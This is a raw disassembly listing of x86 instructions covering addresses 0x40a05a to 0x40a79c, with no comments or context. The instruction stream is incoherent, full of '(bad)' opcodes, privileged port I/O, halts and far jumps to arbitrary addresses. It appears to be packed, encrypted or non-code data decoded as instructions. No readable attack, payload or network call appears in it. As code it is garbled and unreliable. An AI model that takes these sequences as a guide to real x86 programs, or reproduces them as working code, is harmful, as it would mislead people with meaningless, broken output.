  40a05a:	repnz fwait
  40a05c:	test   al,0x75
  40a05e:	push   0xcd181784
  40a063:	pop    es
  40a064:	adc    eax,0xbc7b0f29
  40a069:	scas   al,BYTE PTR es:[edi]
  40a06a:	mov    BYTE PTR [edx-0x2a],0x6e
  40a06e:	imul   ebp,eax,0x3955df
  40a074:	mov    ch,0x4f
  40a076:	jnp    0x40a06d
  40a078:	push   ds
  40a079:	outs   dx,BYTE PTR ds:[esi]
  40a07a:	shr    DWORD PTR [eax],0x42
  40a07d:	popf   
  40a07e:	mov    ch,0x66
  40a080:	outs   dx,DWORD PTR ds:[esi]
  40a081:	mov    dl,0x3b
  40a083:	jns    0x40a0bf
  40a085:	out    dx,eax
  40a086:	cwde   
  40a087:	icebp  
  40a088:	out    dx,eax
  40a089:	shl    DWORD PTR [bx-0x36],1
  40a08d:	mov    ebx,0x13a81a5
  40a092:	jae    0x40a0a4
  40a094:	cmp    al,0x4f
  40a096:	push   esi
  40a097:	fprem1 
  40a099:	(bad)  
  40a09b:	mov    BYTE PTR [eax+0x4b],bh
  40a09e:	out    0x8,eax
  40a0a0:	mov    ah,0x71
  40a0a2:	pop    ebx
  40a0a4:	data16 jp 0x40a0f0
  40a0a7:	fisub  DWORD PTR [eax-0x2802dd14]
  40a0ad:	(bad)  
  40a0ae:	push   edi
  40a0af:	xor    dh,0xf
  40a0b2:	daa    
  40a0b3:	push   ecx
  40a0b4:	ja     0x40a04c
  40a0b6:	push   ds
  40a0b7:	push   ss
  40a0b8:	js     0x40a0f6
  40a0ba:	and    DWORD PTR [edx-0x7112354e],ebx
  40a0c0:	xor    DWORD PTR [eax],esp
  40a0c2:	les    ecx,FWORD PTR [eax+eax*1-0x2]
  40a0c6:	aam    0x4b
  40a0c8:	imul   edi,DWORD PTR [ebx+0x30],0x27
  40a0cc:	in     al,dx
  40a0cd:	in     al,dx
  40a0ce:	sar    BYTE PTR [eax+esi*4+0x78],cl
  40a0d2:	and    al,0x18
  40a0d4:	mov    ebx,0x20fa993a
  40a0d9:	mov    ebp,0x8de968a
  40a0de:	pop    esp
  40a0df:	sub    al,0x75
  40a0e1:	enter  0x64dd,0x97
  40a0e5:	mov    ecx,fs
  40a0e7:	and    DWORD PTR [edi],ebx
  40a0e9:	mov    ds:0xe9869db9,eax
  40a0ee:	and    ebx,DWORD PTR [edi+0x607e2877]
  40a0f4:	inc    esi
  40a0f5:	jecxz  0x40a094
  40a0f7:	pop    ebp
  40a0f8:	jmp    0x40a118
  40a0fa:	mov    bl,0x6d
  40a0fc:	cli    
  40a0fd:	adc    eax,0x178b6e8d
  40a102:	lods   eax,DWORD PTR ds:[esi]
  40a103:	and    eax,0xb706e567
  40a108:	adc    bh,bl
  40a10a:	imul   esi,DWORD PTR [ecx+ebx*8-0x42ae0d1e],0x67a070a2
  40a115:	leave  
  40a116:	lock mov BYTE PTR [eax],0x7b
  40a11a:	mov    al,0xe0
  40a11c:	xchg   esp,eax
  40a11d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a11e:	pop    edi
  40a11f:	les    edi,FWORD PTR [ebx]
  40a121:	test   BYTE PTR [esi+ebp*8+0x36b4c9c1],bh
  40a128:	sub    al,BYTE PTR [ebp*4+0x4aa6837c]
  40a12f:	mov    ch,0x4d
  40a131:	ret    
  40a132:	or     al,0x6c
  40a134:	dec    ebp
  40a135:	shr    BYTE PTR [edi-0x80],1
  40a138:	int    0xcb
  40a13a:	add    DWORD PTR [ebp+0x71b1340a],0x79
  40a141:	cmp    al,0x2
  40a143:	outs   dx,DWORD PTR ds:[esi]
  40a144:	sub    DWORD PTR ds:0x50adc6d8,esi
  40a14a:	jmp    0xfc7c:0x32b6ecbf
  40a151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a152:	stc    
  40a153:	idiv   DWORD PTR ds:0x9b6c5ed
  40a159:	repnz stos BYTE PTR es:[edi],al
  40a15b:	push   esi
  40a15c:	jae    0x40a1bb
  40a15e:	arpl   WORD PTR [edx-0x18],sp
  40a161:	mov    eax,0xfb7599c6
  40a166:	shr    DWORD PTR [esi+0x7890d1ec],cl
  40a16c:	mov    edx,0x7e95370f
  40a171:	imul   ebp,DWORD PTR [ecx-0x4a],0x6f98c04b
  40a178:	pop    ecx
  40a179:	pop    ds
  40a17a:	sub    eax,0x1321a6a7
  40a17f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a180:	mov    esp,?
  40a182:	mov    esi,gs
  40a184:	icebp  
  40a185:	jo     0x40a1e3
  40a187:	and    DWORD PTR [edi],ecx
  40a189:	sbb    esi,DWORD PTR [ebx-0x55dec6c8]
  40a18f:	or     eax,0x3094f403
  40a194:	call   0xeb9be5a0
  40a199:	push   ds
  40a19a:	retf   
  40a19b:	pusha  
  40a19c:	(bad)  
  40a19d:	xor    al,0x78
  40a19f:	imul   ebx,DWORD PTR [eax],0xfffffff2
  40a1a2:	push   0x3c
  40a1a4:	(bad)  
  40a1a5:	scas   eax,DWORD PTR es:[edi]
  40a1a6:	add    al,0x2e
  40a1a8:	or     dh,bl
  40a1aa:	jne    0x40a1b6
  40a1ac:	mov    ecx,0x1b0d3a13
  40a1b1:	xor    BYTE PTR [ecx-0x3c],bh
  40a1b4:	mov    BYTE PTR [edx],0xd5
  40a1b7:	adc    eax,DWORD PTR [esi]
  40a1b9:	int3   
  40a1ba:	push   eax
  40a1bb:	shr    DWORD PTR [ebx+0x1b],cl
  40a1be:	cmp    DWORD PTR [ecx+0x5053220d],esi
  40a1c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1c5:	fdivr  QWORD PTR [eax+0x5bd61f8]
  40a1cb:	mov    dh,al
  40a1cd:	fldcw  WORD PTR [edi-0x68877fbb]
  40a1d3:	leave  
  40a1d4:	aas    
  40a1d5:	pop    ss
  40a1d6:	add    edi,edx
  40a1d8:	popf   
  40a1d9:	dec    edi
  40a1da:	scas   al,BYTE PTR es:[edi]
  40a1db:	mov    ds:0x90ca3ed9,eax
  40a1e0:	and    BYTE PTR [ebx-0x7134b8eb],0x2f
  40a1e7:	xlat   BYTE PTR ds:[ebx]
  40a1e8:	xor    ch,ch
  40a1ea:	mov    edx,0x35e169cc
  40a1ef:	idiv   BYTE PTR [ecx+0x51]
  40a1f2:	loope  0x40a21d
  40a1f4:	mov    dl,0xe6
  40a1f6:	dec    esp
  40a1f7:	lds    ecx,FWORD PTR [ebp-0x631f1488]
  40a1fd:	jb     0x40a17f
  40a1ff:	jge    0x40a1bb
  40a201:	mov    ebp,0x27e4a3
  40a206:	or     eax,0x816618ff
  40a20b:	add    ebx,ebp
  40a20d:	test   DWORD PTR [esi],0x21c77de1
  40a213:	mov    edi,esp
  40a215:	adc    ah,dl
  40a217:	scas   eax,DWORD PTR es:[edi]
  40a218:	inc    ebp
  40a219:	mov    eax,0x33ff91a9
  40a21e:	in     al,dx
  40a21f:	pop    edi
  40a220:	add    eax,0x6c664158
  40a225:	push   edx
  40a226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a227:	sub    BYTE PTR [edi-0x3e],ah
  40a22a:	xchg   DWORD PTR [esi],eax
  40a22c:	jne    0x40a230
  40a22e:	shl    DWORD PTR [edx+0x56],0x6
  40a232:	ins    BYTE PTR es:[edi],dx
  40a233:	(bad)  
  40a234:	fdivr  st(4),st
  40a236:	cmp    dh,BYTE PTR [ecx]
  40a238:	inc    esi
  40a239:	adc    al,0x47
  40a23b:	pop    ebp
  40a23c:	mov    ebx,0x48d662
  40a241:	push   edx
  40a242:	inc    dl
  40a244:	push   ds
  40a245:	sub    esi,esi
  40a247:	adc    al,0x18
  40a249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a24a:	aad    0x4
  40a24c:	xchg   ebp,eax
  40a24d:	push   edx
  40a24e:	mov    dh,0x9d
  40a250:	mov    esi,0x7a975ed5
  40a255:	aas    
  40a256:	sahf   
  40a257:	ja     0x40a2a3
  40a259:	pusha  
  40a25a:	push   esi
  40a25b:	pop    esi
  40a25c:	sar    DWORD PTR [ecx+ebx*1+0x1e],1
  40a260:	or     BYTE PTR ss:[esi+0x3],dh
  40a264:	pop    ds
  40a265:	xor    al,ah
  40a267:	dec    eax
  40a268:	push   es
  40a269:	jmp    0x40a21e
  40a26b:	daa    
  40a26c:	add    al,0x57
  40a26e:	loop   0x40a241
  40a270:	(bad)  
  40a271:	gs xchg edi,eax
  40a273:	adc    edi,edx
  40a275:	push   ss
  40a276:	cmp    ch,BYTE PTR ds:0x2287b28f
  40a27c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a27d:	lds    esi,FWORD PTR [esi-0x1ef4fc8]
  40a283:	data16 int3 
  40a285:	shl    DWORD PTR ds:0x70554d74,1
  40a28b:	xchg   esi,eax
  40a28c:	sar    BYTE PTR [eax],cl
  40a28e:	jge    0x40a242
  40a290:	mov    al,0x18
  40a292:	fwait
  40a293:	mov    ds:0x5bb96c9a,al
  40a298:	dec    ebp
  40a299:	mov    ch,0xa0
  40a29b:	js     0x40a2fa
  40a29d:	push   ebx
  40a29e:	dec    esp
  40a29f:	pop    edx
  40a2a0:	push   eax
  40a2a1:	and    al,0x2f
  40a2a3:	mov    dl,0x27
  40a2a5:	push   0xffffffc3
  40a2a7:	xchg   ecx,eax
  40a2a8:	lods   eax,DWORD PTR ds:[esi]
  40a2a9:	lods   al,BYTE PTR ds:[esi]
  40a2aa:	xchg   ebx,eax
  40a2ab:	mov    al,0x7c
  40a2ad:	std    
  40a2ae:	sbb    dh,BYTE PTR [ebx-0x3bfac708]
  40a2b4:	mov    esi,0xb990fd3d
  40a2b9:	push   esi
  40a2ba:	inc    esp
  40a2bb:	scas   al,BYTE PTR es:[edi]
  40a2bc:	pop    ecx
  40a2bd:	mov    dl,dl
  40a2bf:	pop    ss
  40a2c0:	daa    
  40a2c1:	out    0x9e,eax
  40a2c3:	fldcw  WORD PTR [esp+ebp*2]
  40a2c6:	ret    
  40a2c7:	xor    ecx,DWORD PTR [eax]
  40a2c9:	adc    ch,BYTE PTR [ecx+0x1e]
  40a2cc:	inc    ebx
  40a2cd:	test   al,0x1
  40a2cf:	push   ecx
  40a2d0:	pop    ds
  40a2d1:	mov    BYTE PTR fs:[eax-0x28],al
  40a2d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2d6:	fsubr  st(1),st
  40a2d8:	scas   eax,DWORD PTR es:[edi]
  40a2d9:	xchg   ebp,eax
  40a2da:	out    dx,eax
  40a2db:	aas    
  40a2dc:	mov    cs,WORD PTR [edx]
  40a2de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2df:	mov    ecx,DWORD PTR [esi]
  40a2e1:	add    al,0x99
  40a2e3:	(bad)  
  40a2e4:	(bad)  
  40a2e6:	in     al,dx
  40a2e7:	or     bh,BYTE PTR [eax-0x57cb8e95]
  40a2ed:	not    BYTE PTR [eax+0x73]
  40a2f0:	cld    
  40a2f1:	xor    edi,ecx
  40a2f3:	gs mov ecx,0xf39fa265
  40a2f9:	or     ebx,DWORD PTR [eax+0x4e0fee2e]
  40a2ff:	cld    
  40a300:	dec    eax
  40a301:	dec    ecx
  40a302:	inc    edi
  40a303:	gs mov dh,0x7c
  40a306:	cmp    edi,DWORD PTR [ebp-0x9]
  40a309:	outs   dx,DWORD PTR ds:[esi]
  40a30a:	mov    al,0x1
  40a30c:	or     bl,ah
  40a30e:	or     al,0xd0
  40a310:	(bad)  
  40a311:	fld    st(7)
  40a313:	lea    ebx,[esi+eax*4-0xb592900]
  40a31a:	(bad)  
  40a31b:	sahf   
  40a31c:	cs jno 0x40a355
  40a31f:	rcr    BYTE PTR [edx+0x72],cl
  40a322:	test   al,0x2d
  40a324:	in     al,dx
  40a325:	dec    ebx
  40a326:	pop    ds
  40a327:	sub    al,0x9a
  40a329:	adc    DWORD PTR [ebp+0x38],ecx
  40a32c:	(bad)  
  40a32d:	sbb    DWORD PTR [edi],esi
  40a32f:	jno    0x40a2ba
  40a331:	test   al,0xe1
  40a333:	cwde   
  40a334:	add    eax,0x1cfdea7e
  40a339:	test   eax,0x5124f937
  40a33e:	(bad)  
  40a33f:	and    ecx,ecx
  40a341:	xchg   edi,eax
  40a342:	ret    0x7b8d
  40a345:	out    dx,eax
  40a346:	xchg   BYTE PTR [esi],bl
  40a348:	jb     0x40a34b
  40a34a:	inc    ebp
  40a34b:	adc    ecx,DWORD PTR [ecx]
  40a34d:	daa    
  40a34e:	jmp    0xcbf8:0x87f2bffb
  40a355:	sbb    edx,eax
  40a357:	loope  0x40a3b1
  40a359:	ins    DWORD PTR es:[edi],dx
  40a35a:	push   edx
  40a35b:	mov    esp,0x455dac22
  40a360:	(bad)  [ebp+0xe0988c9]
  40a366:	mov    ah,0x85
  40a368:	loop   0x40a324
  40a36a:	push   edx
  40a36b:	pop    edx
  40a36c:	push   cs
  40a36d:	adc    DWORD PTR [esi-0x1a26ccc2],ebx
  40a373:	in     eax,dx
  40a374:	sbb    eax,0x9d30e02f
  40a379:	xchg   edi,eax
  40a37a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a37b:	cmp    eax,0x7dc4f43
  40a380:	push   esp
  40a381:	mov    ch,0xf6
  40a383:	inc    ebp
  40a384:	adc    BYTE PTR [eax-0x32],dl
  40a387:	cmp    DWORD PTR [edi],0xd25a1a76
  40a38d:	cs les ecx,FWORD PTR gs:[edi]
  40a391:	ins    DWORD PTR es:[edi],dx
  40a392:	push   edx
  40a393:	mov    eax,0xd620385c
  40a398:	dec    edi
  40a399:	mov    WORD PTR [ecx+ebp*2-0x27],ds
  40a39d:	je     0x40a40e
  40a39f:	je     0x40a39f
  40a3a1:	mov    ebx,0x58e197a1
  40a3a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3a7:	push   edx
  40a3a8:	xchg   ebx,eax
  40a3a9:	jmp    0xf3f5b292
  40a3ae:	hlt    
  40a3af:	mov    dh,BYTE PTR [ebx-0xb3c9724]
  40a3b5:	(bad)  
  40a3b6:	xor    bh,BYTE PTR [ecx+0x7a40cb23]
  40a3bc:	es fucomp st(7)
  40a3bf:	mov    ebp,DWORD PTR [ebp+0x19]
  40a3c2:	pusha  
  40a3c3:	dec    ebx
  40a3c4:	or     eax,0xa7afdb8b
  40a3c9:	add    al,0xe
  40a3cb:	sub    cl,0xff
  40a3ce:	aam    0x8
  40a3d0:	pusha  
  40a3d1:	adc    bl,ah
  40a3d3:	sub    eax,0x5a0660f3
  40a3d8:	out    dx,al
  40a3d9:	jne    0x40a44b
  40a3db:	dec    edx
  40a3dc:	pop    edx
  40a3dd:	cmovle esp,DWORD PTR [edi]
  40a3e0:	sbb    ch,BYTE PTR [ecx+edi*4+0xfbfbda5]
  40a3e7:	fdivr  QWORD PTR [edi]
  40a3e9:	fs pop eax
  40a3eb:	xchg   ecx,ebx
  40a3ed:	js     0x40a451
  40a3ef:	add    DWORD PTR [ebx-0x364e729f],edx
  40a3f5:	cwde   
  40a3f6:	dec    ecx
  40a3f7:	fimul  DWORD PTR [edi]
  40a3f9:	in     eax,dx
  40a3fa:	ins    BYTE PTR es:[edi],dx
  40a3fb:	popa   
  40a3fc:	es int3 
  40a3fe:	sub    al,0x53
  40a400:	mov    eax,0x67acba2c
  40a405:	call   0xb151:0x62bec492
  40a40c:	jo     0x40a3a6
  40a40e:	repnz (bad) 
  40a410:	fcomp  st(5)
  40a412:	adc    DWORD PTR [esi],edx
  40a414:	ud2    
  40a416:	fwait
  40a417:	jno    0x40a477
  40a419:	icebp  
  40a41a:	enter  0x36f7,0x9e
  40a41e:	into   
  40a41f:	mov    cl,0xd9
  40a421:	bound  edi,QWORD PTR [eax+0x77]
  40a424:	sbb    al,0xb2
  40a426:	push   esi
  40a427:	mov    bl,0x6
  40a429:	clc    
  40a42a:	sub    edx,edi
  40a42c:	pop    es
  40a42d:	or     al,0x24
  40a42f:	cmp    eax,0x3dd1df42
  40a434:	into   
  40a435:	aad    0x10
  40a437:	and    dh,BYTE PTR [ebx+ecx*8]
  40a43a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a43b:	xchg   esi,eax
  40a43c:	loope  0x40a4a7
  40a43e:	or     DWORD PTR [ecx+0x255cc93d],0xffffffdf
  40a445:	aam    0x6
  40a447:	xchg   ebp,eax
  40a448:	cmp    eax,0x5851216
  40a44d:	mov    al,ds:0x9173f181
  40a452:	icebp  
  40a453:	inc    esp
  40a454:	test   eax,0x26c12da3
  40a459:	push   ebx
  40a45a:	adc    eax,0xce0894df
  40a45f:	adc    DWORD PTR [ebx+0x62c7aa85],edx
  40a465:	js     0x40a470
  40a467:	push   esp
  40a468:	sahf   
  40a469:	sub    al,0x71
  40a46b:	ins    BYTE PTR es:[edi],dx
  40a46c:	mov    ss,esp
  40a46e:	dec    esp
  40a46f:	jb     0x40a3fd
  40a471:	das    
  40a472:	sub    al,BYTE PTR [edi]
  40a474:	inc    ecx
  40a475:	mov    ebp,0xf9c5df58
  40a47a:	push   edi
  40a47b:	sub    BYTE PTR [ebp+0x62],0x3f
  40a47f:	jns    0x40a4df
  40a481:	enter  0x80a5,0x5c
  40a485:	repnz mov al,ds:0x49390039
  40a48b:	mov    cl,0x4c
  40a48d:	and    eax,0x968dbb77
  40a492:	sbb    al,0x79
  40a494:	cmc    
  40a495:	jns    0x40a44d
  40a497:	addr16 jp 0x40a423
  40a49a:	je     0x40a464
  40a49c:	inc    ecx
  40a49d:	mov    ds:0xf8c5f668,eax
  40a4a2:	adc    ebx,DWORD PTR [esi-0x68]
  40a4a5:	scas   eax,DWORD PTR es:[edi]
  40a4a6:	mov    al,0xff
  40a4a8:	mov    bh,0xb4
  40a4aa:	add    BYTE PTR ds:0x5e27fcba,dh
  40a4b0:	shr    ah,cl
  40a4b2:	push   esi
  40a4b3:	neg    BYTE PTR [edx]
  40a4b5:	fs cli 
  40a4b7:	mov    eax,0xd95037fa
  40a4bc:	into   
  40a4bd:	(bad)  
  40a4be:	cmp    eax,0x2f042d10
  40a4c3:	mov    ch,bl
  40a4c5:	mov    ebx,ecx
  40a4c7:	in     eax,dx
  40a4c8:	in     al,0x76
  40a4ca:	mov    eax,0x67b131fb
  40a4cf:	dec    eax
  40a4d0:	dec    ebp
  40a4d1:	and    BYTE PTR [edi-0x3acaa14a],bl
  40a4d7:	dec    edx
  40a4d8:	test   DWORD PTR [ecx-0x7cefee79],ecx
  40a4de:	lahf   
  40a4df:	lods   al,BYTE PTR ds:[esi]
  40a4e0:	xchg   esp,eax
  40a4e1:	mov    dh,0x1f
  40a4e3:	adc    DWORD PTR [edx],0xffffffe5
  40a4e6:	jbe    0x40a555
  40a4e8:	fwait
  40a4e9:	loop   0x40a568
  40a4eb:	das    
  40a4ec:	cmp    eax,0x6bc5fad4
  40a4f1:	lods   eax,DWORD PTR ds:[esi]
  40a4f2:	push   ds
  40a4f3:	stc    
  40a4f4:	enter  0xc0df,0xa6
  40a4f8:	add    cl,cl
  40a4fa:	push   ebp
  40a4fb:	inc    ecx
  40a4fc:	dec    esp
  40a4fd:	popa   
  40a4fe:	sbb    eax,0x9cc6901c
  40a503:	push   esp
  40a504:	sbb    cl,BYTE PTR [ebx-0x1d]
  40a507:	fist   WORD PTR [edx+0x62]
  40a50a:	stc    
  40a50b:	xor    al,0xf5
  40a50d:	in     eax,dx
  40a50e:	jae    0x40a527
  40a510:	jae    0x40a503
  40a512:	repnz push ss
  40a514:	inc    esp
  40a515:	xor    esp,DWORD PTR [ecx-0x2619e338]
  40a51b:	jecxz  0x40a549
  40a51d:	shr    BYTE PTR [edi+0x76d3ac40],0xeb
  40a524:	cli    
  40a525:	inc    esp
  40a526:	sbb    BYTE PTR [eax-0x48],cl
  40a529:	aaa    
  40a52a:	fs cmc 
  40a52c:	in     ax,0x25
  40a52f:	jno    0x40a51b
  40a531:	push   0x9
  40a533:	pop    eax
  40a534:	(bad)  
  40a535:	fidiv  DWORD PTR [eax]
  40a537:	mov    esi,0x16dec39a
  40a53c:	cmp    al,0xee
  40a53e:	pushf  
  40a53f:	add    esp,esi
  40a541:	mov    cl,0x6d
  40a543:	in     al,0x98
  40a545:	pop    edx
  40a546:	(bad)  
  40a547:	push   ss
  40a548:	mov    al,0x9a
  40a54a:	das    
  40a54b:	pop    esi
  40a54c:	scas   eax,DWORD PTR es:[edi]
  40a54d:	(bad)  
  40a54e:	and    al,0x63
  40a550:	mov    esp,0x3cc6a1d6
  40a555:	mov    bl,0x84
  40a557:	outs   dx,BYTE PTR ds:[esi]
  40a558:	mov    ch,0x74
  40a55a:	jle    0x40a5be
  40a55c:	cmp    DWORD PTR [edi-0x5ed3f20],0xe8bdfb5b
  40a566:	jb     0x40a51e
  40a568:	std    
  40a569:	rcr    dh,cl
  40a56b:	cmc    
  40a56c:	in     eax,0x72
  40a56e:	fwait
  40a56f:	cwde   
  40a570:	pop    ds
  40a571:	inc    edi
  40a572:	int3   
  40a573:	xchg   ecx,eax
  40a574:	mov    esp,0x8fbb50f2
  40a579:	pusha  
  40a57a:	or     DWORD PTR [edi+edi*4-0x18],esp
  40a57e:	mov    eax,ds:0x1c07a8c3
  40a583:	cli    
  40a584:	fadd   DWORD PTR [ebx+eiz*1]
  40a587:	popa   
  40a588:	jb     0x40a53d
  40a58a:	data16 sahf 
  40a58c:	add    ebx,DWORD PTR [eax-0x16]
  40a58f:	popf   
  40a590:	push   0xa4a07227
  40a595:	add    DWORD PTR [ecx],esi
  40a597:	pop    es
  40a598:	stc    
  40a599:	dec    eax
  40a59a:	add    al,0xae
  40a59c:	or     BYTE PTR [edx+0x46f15e92],0xdc
  40a5a3:	ror    eax,1
  40a5a5:	jo     0x40a532
  40a5a7:	fcom   QWORD PTR [ecx+0x5a]
  40a5aa:	or     al,0xb1
  40a5ac:	xchg   ebx,eax
  40a5ad:	dec    esi
  40a5ae:	ror    DWORD PTR [ebp-0x68],0xb1
  40a5b2:	sar    dl,cl
  40a5b4:	fbld   TBYTE PTR [edx+0x58]
  40a5b7:	dec    edx
  40a5b8:	pop    ss
  40a5b9:	xor    ebx,DWORD PTR [ecx+0x78317a16]
  40a5bf:	retf   0xf32b
  40a5c2:	push   es
  40a5c3:	lds    ebp,FWORD PTR [ebx]
  40a5c5:	push   esp
  40a5c6:	ins    DWORD PTR es:[edi],dx
  40a5c7:	inc    esi
  40a5c8:	sub    al,BYTE PTR [ecx+0x1e1163f]
  40a5ce:	pmuludq mm4,QWORD PTR [eax]
  40a5d1:	retf   
  40a5d2:	mov    bh,0x8
  40a5d4:	xor    bh,ah
  40a5d6:	lds    esp,FWORD PTR [ecx]
  40a5d8:	pop    edx
  40a5d9:	call   0x7583173b
  40a5de:	mov    DWORD PTR [edx+0x54f9f8af],ecx
  40a5e4:	nop
  40a5e5:	mov    dl,0x81
  40a5e7:	xchg   DWORD PTR [esi-0x3e],edx
  40a5ea:	mov    al,BYTE PTR ds:0x6e0eb696
  40a5f0:	(bad)  
  40a5f1:	aad    0x8f
  40a5f3:	cdq    
  40a5f4:	add    eax,0xa837c78f
  40a5f9:	ja     0x40a673
  40a5fb:	push   0x8ac9f18d
  40a600:	sub    al,0x62
  40a602:	aad    0xcc
  40a604:	mov    ebx,0x986ac251
  40a609:	ds push es
  40a60b:	dec    ebx
  40a60c:	cmp    al,0x62
  40a60e:	cmp    al,0xe0
  40a610:	ins    DWORD PTR es:[edi],dx
  40a611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a612:	sub    esp,DWORD PTR [edx]
  40a614:	aam    0xc3
  40a616:	cmc    
  40a617:	sbb    DWORD PTR [esi],eax
  40a619:	je     0x40a59b
  40a61b:	push   edi
  40a61c:	jbe    0x40a685
  40a61e:	inc    ebx
  40a61f:	sbb    esp,eax
  40a621:	loop   0x40a5b5
  40a623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a624:	in     al,0x33
  40a626:	and    edx,0x26442699
  40a62c:	xchg   esp,eax
  40a62d:	sbb    dh,ch
  40a62f:	pop    es
  40a630:	out    0x50,eax
  40a632:	jg     0x40a605
  40a634:	outs   dx,BYTE PTR ds:[esi]
  40a635:	mov    al,ds:0x64bc9f1e
  40a63a:	imul   ebx,esi,0x12
  40a63d:	push   ebx
  40a63e:	call   0x74a07e0c
  40a643:	mov    ds:0x2705ac6d,al
  40a648:	mov    ds:0x2ea1ed68,eax
  40a64d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a64e:	pop    ebx
  40a64f:	in     al,dx
  40a650:	adc    esi,DWORD PTR [ecx+0x6b96bf65]
  40a656:	mov    al,0x13
  40a658:	ffreep st(2)
  40a65a:	and    dl,al
  40a65c:	pop    edx
  40a65d:	xchg   edx,eax
  40a65e:	mov    cl,0x55
  40a660:	addr16 aas 
  40a662:	clc    
  40a663:	pop    ebx
  40a664:	mov    DWORD PTR [ebx],ebx
  40a666:	shr    DWORD PTR [eax+0x78792af9],1
  40a66c:	fild   DWORD PTR [edx+edi*4]
  40a66f:	add    esp,ebx
  40a671:	repz sub BYTE PTR [esi+0x4c],al
  40a675:	test   eax,0x98916d6a
  40a67a:	dec    eax
  40a67b:	sub    al,0xa5
  40a67d:	scas   al,BYTE PTR es:[edi]
  40a67e:	jo     0x40a6a0
  40a680:	jns    0x40a6fe
  40a682:	retf   0x7ec1
  40a685:	xchg   ecx,eax
  40a686:	rol    DWORD PTR [ecx],0xc0
  40a689:	loope  0x40a681
  40a68b:	dec    esp
  40a68c:	stc    
  40a68d:	pop    ebx
  40a68e:	push   eax
  40a68f:	fxch   st(2)
  40a691:	cdq    
  40a692:	push   ebp
  40a693:	in     al,0x8b
  40a695:	(bad)  
  40a696:	sti    
  40a697:	xor    DWORD PTR [edx-0x529e9603],esp
  40a69d:	lea    edi,[ebx]
  40a69f:	xchg   esi,eax
  40a6a0:	mov    ah,0x4e
  40a6a2:	ret    
  40a6a3:	mov    ds:0x80e7d0ae,al
  40a6a8:	or     bh,BYTE PTR [ebx+0x3336ad1e]
  40a6ae:	pop    esi
  40a6af:	mov    bl,bl
  40a6b1:	dec    ebp
  40a6b2:	fsubr  st,st(3)
  40a6b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6b5:	loopne 0x40a6b3
  40a6b7:	dec    ebx
  40a6b8:	test   DWORD PTR [ecx-0xaab0949],ebp
  40a6be:	lods   al,BYTE PTR ds:[esi]
  40a6bf:	aam    0xc3
  40a6c1:	mov    edi,0x4789141d
  40a6c6:	daa    
  40a6c7:	clc    
  40a6c8:	xchg   ecx,eax
  40a6c9:	push   cs
  40a6ca:	jl     0x40a675
  40a6cc:	sti    
  40a6cd:	rol    ebp,1
  40a6cf:	inc    eax
  40a6d0:	add    esi,DWORD PTR [edx]
  40a6d2:	sar    BYTE PTR [edi-0x68],0xec
  40a6d6:	xchg   bh,ch
  40a6d8:	sub    eax,0xf90ed311
  40a6dd:	xchg   esp,eax
  40a6de:	jp     0x40a71b
  40a6e0:	push   edx
  40a6e1:	aas    
  40a6e2:	stc    
  40a6e3:	rol    DWORD PTR [ecx-0x4],cl
  40a6e6:	(bad)  
  40a6e7:	std    
  40a6e8:	fnstenv ds:0xe383dc24
  40a6ee:	dec    edx
  40a6ef:	mov    ebx,0xd7cfce8e
  40a6f4:	or     dl,BYTE PTR [esi+0x6176ca4]
  40a6fa:	sub    al,0xa2
  40a6fc:	gs jbe 0x40a73f
  40a6ff:	and    dl,BYTE PTR cs:[esi+ebx*8+0xdcf0377]
  40a707:	dec    DWORD PTR [eax+0x5954a6ea]
  40a70d:	cwde   
  40a70e:	add    DWORD PTR [edi+0x6d728bd0],ebx
  40a714:	fist   DWORD PTR [edi+edi*1-0x73434dbb]
  40a71b:	xchg   edi,eax
  40a71c:	mov    cl,bh
  40a71e:	dec    edx
  40a71f:	pushf  
  40a720:	mov    ss,WORD PTR [esi+0x2c3f9f0f]
  40a726:	xor    bl,BYTE PTR [edx-0x5148f221]
  40a72c:	stos   DWORD PTR es:[edi],eax
  40a72d:	sbb    bh,BYTE PTR [esi]
  40a72f:	adc    dh,BYTE PTR [ecx]
  40a731:	sub    al,0x57
  40a733:	pop    edx
  40a734:	fldenv [ebx+0x553ce221]
  40a73a:	cmc    
  40a73b:	gs ret 
  40a73d:	pop    eax
  40a73e:	in     al,dx
  40a73f:	call   0xbf4bdc58
  40a744:	mov    bh,0x13
  40a746:	mov    esi,0x3e89e7c6
  40a74b:	cld    
  40a74c:	popa   
  40a74d:	out    dx,eax
  40a74e:	pop    eax
  40a74f:	push   ds
  40a750:	dec    edx
  40a751:	jae    0x40a6fb
  40a753:	pop    esi
  40a754:	jge    0x40a73e
  40a756:	mov    ch,0xeb
  40a758:	add    esp,DWORD PTR [ebx+0x11464a02]
  40a75e:	xor    dl,BYTE PTR [edx]
  40a760:	rcr    edi,0x48
  40a763:	jae    0x40a7b3
  40a765:	fstp   DWORD PTR [edi-0x4ee2839d]
  40a76b:	loopne 0x40a782
  40a76d:	push   cs
  40a76e:	jmp    0xf9efac58
  40a773:	enter  0xda42,0xd8
  40a777:	fs xor eax,0x9c3d95b8
  40a77d:	retf   
  40a77e:	xor    edi,DWORD PTR [edx+0x47e7cc2c]
  40a784:	cwde   
  40a785:	in     eax,dx
  40a786:	out    0x99,al
  40a788:	sbb    BYTE PTR [eax],dl
  40a78a:	dec    esi
  40a78b:	xor    BYTE PTR [edx+0x32],dl
  40a78e:	add    BYTE PTR [ecx-0x5f],dl
  40a791:	xor    BYTE PTR [ebp-0x73],dl
  40a794:	mov    ah,0x30
  40a796:	rcl    DWORD PTR [edx+0x27d3c454],cl
  40a79c:	jp     0x40a796
